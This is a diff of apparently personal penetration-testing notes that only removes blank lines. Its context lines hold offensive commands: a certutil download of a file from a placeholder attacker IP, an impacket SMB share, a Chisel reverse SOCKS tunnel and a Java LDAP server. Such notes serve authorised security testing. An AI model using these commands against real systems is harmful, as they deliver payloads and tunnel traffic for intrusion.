@@ -10,7 +10,6 @@ PS > certutil -urlcache -f http://IP:PORT/file file_local
 ```
 Could be used with [[Windows Privesc.#RunasCs.exe]] 
 ## SMB:
-
 Server:
 ```Shell
 sudo impacket-smbserver -smb2support SHARE_NAME RUN_DIR
@@ -22,7 +21,6 @@ Client:
 ```
 
 ## Chisel
-
 Server (Linux):
 ```shell
 $ chisel server --reverse --socks5 -p 8001
@@ -38,7 +36,6 @@ curl -x socks5://127.0.0.1:LPORT https://127.0.0.1:RPORT
 ```
 
 ## LDAP
-
 Server:
 ```Shell
 java -cp .:/opt/unboundid-ldapsdk-7.0.0/unboundid-ldapsdk.jar Server
